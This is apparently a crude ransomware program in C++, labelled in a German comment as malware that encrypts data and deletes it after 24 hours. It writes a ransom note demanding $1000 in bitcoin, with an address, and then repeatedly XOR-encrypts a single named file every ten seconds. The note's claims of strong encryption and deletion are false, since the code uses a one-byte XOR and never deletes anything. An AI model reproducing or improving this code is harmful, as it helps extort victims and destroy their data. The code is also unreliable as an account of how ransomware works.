/* das ist eine ransomware datei die daten verschlüsselt und nach 24h löscht */
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <ctime>

using namespace std;

string encryptDecrypt(string toEncrypt) {
    char key = 'K';
    string output = toEncrypt;
    
    for (int i = 0; i < toEncrypt.size(); i++)
        output[i] = toEncrypt[i] ^ key;
    
    return output;
}

int main() {
    string fileName;
    string line;
    string encryptedLine;
    ifstream file;
    ofstream temp;
    ofstream ransomNote;
    time_t now = time(0);
    char* dt = ctime(&now);
    
    ransomNote.open("RANSOM_NOTE.txt");
    ransomNote << "Your files have been encrypted with a strong encryption algorithm." << endl;
    ransomNote << "There is no way to decrypt your files without paying. If you want to decrypt your files, you have to pay 1000$." << endl;
    ransomNote << "After 24 hours, your files will be deleted permanently." << endl;
    ransomNote << "Contact us at" << endl;
    ransomNote << "Email: <<email>>" << endl;
    ransomNote << "Bitcoin Address: 1J5Y7pJU9zrWQXtJZo6bJL4f7zr9vZz7e" << endl;
    ransomNote << "Date: " << dt << endl;

    ransomNote.close();

    while (true) {
        file.open("dpct.cpp");
        temp.open("temp.cpp");
        
        if (file.is_open()) {
            while (getline(file, line)) {
                encryptedLine = encryptDecrypt(line);
                temp << encryptedLine << endl;
            }
            
            file.close();
            temp.close();
            
            remove("dpct.cpp");
            rename("temp.cpp", "dpct.cpp");
        }
        
        Sleep(10000);
    }

    return 0;
}
